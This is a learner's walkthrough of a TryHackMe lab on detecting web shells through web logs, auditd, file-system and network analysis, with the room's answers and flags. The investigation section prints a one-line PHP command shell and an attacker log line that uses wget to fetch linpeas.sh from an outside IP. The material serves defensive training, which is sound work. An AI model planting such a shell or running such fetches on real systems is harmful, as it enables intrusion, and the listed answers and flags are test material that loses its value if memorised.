<h1 align="center">Detecting Web Shells</h1>
<p align="center">2025, August 6<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>457</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Explore web shell detection by analyzing logs, file systems, and network traffic.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/191591c5-f32b-4876-bb8d-06a4b760ed93"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/detectingwebshell">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/13c86296-774c-419b-8570-f1d11ac229a6"></p>

<br>
<h2>Task 1 . Introduction</h2>
<br>

<p><em>Answer the question below</em></p>

<p>1.1. I understand the learning objectives and am ready to embark on a web shell adventure.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Web Shell Overview</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>2.1 Which MITRE ATT&CK Persistence sub-technique are web shells associated with?<br>
<code>T1505.003</code></p>

<br>

<p>2.2. What file extension is commonly used for web shells targeting Microsoft Exchange?</p>
<code>.aspx</code></p>

<br>
<h2>Task 3 . Anatomy of the Web Shell</h2>
<h3>Anatomy of a Web Shell</h3>
<br>

<h3>A Web Shell in Action</h3>
<p>A web shell has been deployed on our target machine at http://MACHINE_IP:8080/files/awebshell.php.<br>
It can be accessed directly via browser or by command line, utilizing curl.<br>
Don't forget to URL-encode your commands if accessing the shell via command line (/awebshell.php?cmd=<encoded_command>). Cyberchef can assist.<br>
Example: ls -la becomes ls%20la</p>

<h3>Virtual environment set up</h3>
<p>[ Start Machine ]</p>

<p><em>Answer the questions below</em></p>

<p>3.1. Access the shell and determine which account you have access to by running the <code>whoami</code> command.<br>
<code>www-data</code></p>

<img width="1012" height="286" alt="image" src="https://github.com/user-attachments/assets/ab271d4a-8043-4261-bafc-980fada4f987" />

<img width="1030" height="317" alt="image" src="https://github.com/user-attachments/assets/868e5a1f-0807-4453-a02a-cb2999f52781" />

<br>

<p>3.2. List the directory contents and find the flag using the ls and cat commands.<br>
<code>THM{W3b_Sh3ll_Usag3}</code></p>

<br>
<h2>Task 4 . Log-Based Detection</h2>
<h3>Web Server Logs</h3>
<p>Web shells rely on the abuse of web servers, so web server logs are a natural place to start our hunt for evidence. We will explore what to look for in popular web servers like Apache & Nginx. Understanding the difference between normal and suspicious behavior can help uncover malicious activity.<br>

While the format of web server logs varies depending on the service, access logs generally follow a similar structure and include the following information.<br>

The remote log name field is typically represented by a hyphen (-), as it is a legacy field that is rarely used today. However, it still appears in access logs for compatibility. Similarly, the authenticated user field is usually shown as a hyphen as well, unless the server required prior authentication, in which case it may contain the actual username.</p>


<img width="1400" height="260" alt="image" src="https://github.com/user-attachments/assets/6cd3bf7d-5028-489a-b2ed-2fbe12550a3d" />

<h3>Web Indicators</h3>
<h4></h4>Unusual HTTP Methods & Request Patterns</h4>

<p>

- Repeated GET requests in quick succession could mean an attacker is probing for a valid place to upload a shell<br>
- POST requests to valid upload locations following repeated GET requests<br>
- Repeated GET or POST requests to the same file could indicate web shell interaction</p>

<h4>Request Methods To Be Aware Of.</h4>

<img width="730" height="367" alt="image" src="https://github.com/user-attachments/assets/9c00da25-6920-4811-96e4-257f84a74503" />


<p>Let’s walk through a potential web shell attack sequence using the indicators we've discussed so far.<br>
Note that each request shares the same client IP and user agent. Response codes and timestamps should also be noted.<br>
<code>200 OK</code><br>
<code>404 Not Found</code></p>

<img width="1244" height="590" alt="image" src="https://github.com/user-attachments/assets/b1d76579-d38d-46b3-ad7a-b6e65b65ae8a" />

<h4>Suspicious User-Agents & IP Addresses</h4>
<p>The User-Agent identifies the client making requests to the web server and provides information about the browser, device, and operating system.<br>

- Altered User-Agents: Mozilla/4.0+(+Windows+NT+5.1) shortened to Mozilla/4.0<br>
- Outdated User-Agents: Mozilla/4.0 (compatible; MSIE 6.0) MSIE 6.0 released in 2001<br>
- Blacklisted User-Agents: curl/1.XX.X or wget/1.XX.X for example<br>
- Suspicious IP Addresses: A network normally only sees internal traffic so an outside IP address would be suspicious</p>


<h4>Query Strings</h4>
<p>Part of the URL that associates values with a parameter. example.php?query=somequery<br>

- Abnormally long or suspicious query strings, especially containing keywords like cmd= or exec= 
- Encoded query strings. ?query=whoami becomes ?query=d2hvYW1p when Base64 encoded. Cyberchef is an excellent tool for decoding Base64 and many other forms of encoding and obfuscation.</p>

<h4>Missing Referrer</h4>
<p>The referrer shows the URL the users visited before being linked to the current page.<br>

- A missing referrer can be potentially indicative of web shell activity
- There are valid reasons why a referrer might be missing (e.g., browsers blocking them for privacy, if a URL is directly accessed)</p>

<h4>Sample suspicious web request</h4>
<p> including some of the above indicators.</p>
<p>

- Known malicious or untrusted IP address.
- Abnormal timestamp. Perhaps outside of normal business hours.
- POST request with a search query string to a malicious file.
- No referrer. So this page was accessed directly. (not always a valid indicator)
- A suspicious User-Agent string that is not typically associated with a web browser.</p>

<img width="1400" height="130" alt="image" src="https://github.com/user-attachments/assets/8f9349d1-79dd-4287-9924-366d7ec532fb" />

<h3>Auditd</h3>
<p>A native Linux utility that tracks and records events, creating an audit trail. Rules can be created for auditd, which determine what is logged in the audit.log. Rules can be highly configured to match specific conditions, such as when certain programs are run or files are modified in a particular directory. In the example below, ausearch is used to search for any logs matching the web_shell rule.</p>

<img width="701" height="125" alt="image" src="https://github.com/user-attachments/assets/24c0dfb4-0d4a-4e13-a6fc-3007879cf08e" />

<h3>Web and Auditd Correlation</h3>
<p>Detecting web shells effectively requires correlating multiple log sources. Combining web access and error logs with auditd provides more insight and can confirm if a file was created, modified, or executed, and by which user or process. A suspicious POST request in web logs can be linked to an audit event that includes a creat or execve syscall, showing a script wrote a file or ran commands. Combining this information helps us build a clearer picture of the attack sequence.</p>


<h3>Leverage SIEM Platforms</h3>
<p>Some benefits of Security Information and Event Management (SIEM) platforms include:<br>

- Centralized log collection and correlation, which is especially useful when dealing with many different log types.<br>
- Targeted queries can be created to uncover signs of malicious activity, including web shells.<br>
- Allows analysts to search and analyze logs more efficiently.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. What is the part of the URL that associates values to parameters and can be a valuable indicator of web shell activity?<br>
<code><query strings/code></p>

<br>

<p>4.2. What auditd syscall would confirm that a file was written to disk following a suspicious POST request to /upload.php?<br>
<code>creat</code></p>

<br>
<h2>Task 5 . Beyond Logs</h2>
<h3>File System Analysis</h3>
<br>


<h3>Network Traffic Analysis</h3>
<br>

<p><em>Answer the questions below</em></p>


<p>5.1. What command would you use to locate <code>.php</code> files in the <code>/var/www/</code> directory?<br>
<code>find /var/www/ -type f -name "*.php"</code></p>

<br>

<p>5.2. Which Wireshark filter would you use to search specifically for <code>PUT</code> requests?<br>
<code>http.request.method == "PUT"</code></p>

<br>
<h2>Task 6 . Investigation</h2>
<h3>Investigation</h3>
<p>You have been called to investigate potential signs of a compromise on a WordPress site. Suspicious activity has been reported, and your goal is to analyze the available logs to identify indicators of web shell usage. <br>

Access the target machine from Task 3 via split screen or SSH.</p>

<h3>Credentials</h3>
<p>Only needed if you are using your own machine.
<p>[ ... ]</p>

<p>You have been provided Apache access logs to help conduct your investigation.<br>
<code>/var/log/apache2/access.log</code><br>

When reviewing the logs, remember to be on the lookout for<br>

- repeated or suspicious requests (especially ones to <code>.php</code> files)<br>
- strange request patterns (look for different response codes)<br>
- unusual user-agents (e.g. <code>curl/0.00.0</code>)<br><br>

This is also a great chance to use tools like <code>grep</code> to filter the access log file.<br>
For example, <code>cat /var/log/apache2/access.log | grep "404"</code> can help highlight logs that contain <code>404</code> error responses.<br>

Once you start to build a profile on your attacker, you can further refine your search.</p>

<p><em>Answer the questions below</em></p>

<p>6.1. Which IP address likely belongs to the attacker? Hint : Look for repeated GET requests in quick succession as well as plenty of 404 response codes.<br>
<code>203.0.113.66</code></p>

<br>

<p>6.2. What is the first directory that the attacker successfully identifies? Hint : What response code can we grep for that indicates a successful response?<br>
<code>/wordpress</code></p>

<br>

<p>6.3. What is the name of the <code>.php</code>code> file the attacker uses to upload the web shell? Hint : The attacker successfully identifies a .php file then sends a subsequent POST request.<br>
<code>upload_form.php</code></p>

```bash
ubuntu@tryhackme:~$ cat /var/log/apache2/access.log | grep .php
...
203.0.113.66 - - [17/Jul/2025:06:09:27 +0000] "POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php HTTP/1.1" 200 204 "curl/8.14.1"
```

<br>

<p>6.4. What is the first command run by the attacker using the newly uploaded web shell? Hint : Using grep "cmd=" will allow us to see all of the commands executed by the attacker.<br>
<code>whoami</code></p>

```bash
ubuntu@tryhackme:~$ cat /var/log/apache2/access.log | grep shadyshell.php
203.0.113.66 - - [17/Jul/2025:06:09:27 +0000] "POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php HTTP/1.1" 200 204 "curl/8.14.1"
203.0.113.66 - - [17/Jul/2025:06:12:23 +0000] "GET /wordpress/wp-content/uploads/shadyshell.php HTTP/1.1" 200 456 "curl/8.14.1"
203.0.113.66 - - [17/Jul/2025:06:14:55 +0000] "GET /wordpress/wp-content/uploads/shadyshell.php?cmd=whoami HTTP/1.1" 200 10 "curl/8.14.1"
...
```

<br>

<p>6.5. After gaining access via the web shell, the attacker uses a command to download a second file onto the server. What is the name of this file?<br>
<code>linpeas.sh</code></p>

```bash
ubuntu@tryhackme:~$ cat /var/log/apache2/access.log | grep '/wordpress/wp-content/uploads/shadyshell.php?cmd='
...
203.0.113.66 - - [17/Jul/2025:06:20:36 +0000] "GET /wordpress/wp-content/uploads/shadyshell.php?cmd=wget%20http://203.0.113.66:8000/linpeas.sh HTTP/1.1" 200 1 "curl/8.14.1"
```

<br>

<p>6.6. The attacker has hidden a secret within the web shell. Use cat to investigate the web shell code and find the flag. Hint : The web shell is stored in /var/www/html/wordpress/wp-content/uploads.<br>
<code></code></p>

```bash
ubuntu@tryhackme:/var/www/html/wordpress/wp-content/uploads$ ls
2025  customerinfo.pdf  linpeas.sh  pic1.png  pic2.png  shadyshell.php
ubuntu@tryhackme:/var/www/html/wordpress/wp-content/uploads$ cat shadyshell.php
<?php system($_GET['cmd']); ?>

<!-- FLAG: THM{W3b_Sh3ll_Int3rnals} -->
```

<br>
<h2>Task 7 . Conclusion</h2>
<p>In this room, we covered how to detect web shells through log, file system, network, and behavioral analysis using a combination of native OS utilities and specialized security tools. By working through log samples and simulated attack scenarios, we developed a deeper understanding of how web shells behave and how to uncover them using real-world indicators.</p>

<p><em>Answer the question below</em></p>

<p>7.1. Complete the room and continue on your cyber learning journey!<br>
<code>No answer needed</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/98774f0b-90f2-456a-93b2-f95563a342e7"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/32ec7b03-8a80-4f40-88e4-b0d458ab3cb4"></p>


<img width="1893" height="898" alt="image" src="https://github.com/user-attachments/assets/32ec7b03-8a80-4f40-88e4-b0d458ab3cb4" />


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 6    |   457    |     131ˢᵗ    |      5ᵗʰ     |     594ᵗʰ   |    11ˢᵗ   | 119,390  |    899    |    73     |


</div>

<p align="center">Global All Time:   131ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/55fd6002-ad62-468e-9bec-a07a1bf09409"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/15757a8a-c71a-4def-aa28-e438b8245052"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src=https://github.com/user-attachments/assets/47f8762e-597e-4e7f-8ebe-2c3439033566"><br>
                  Global monthly:    594ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/daab4341-1a36-4f69-a0de-ce9a014ea0ae"><br>
                  Brazil monthly:     11ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/625ffd52-4f9f-42d3-8e8d-29039d15d4b5"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
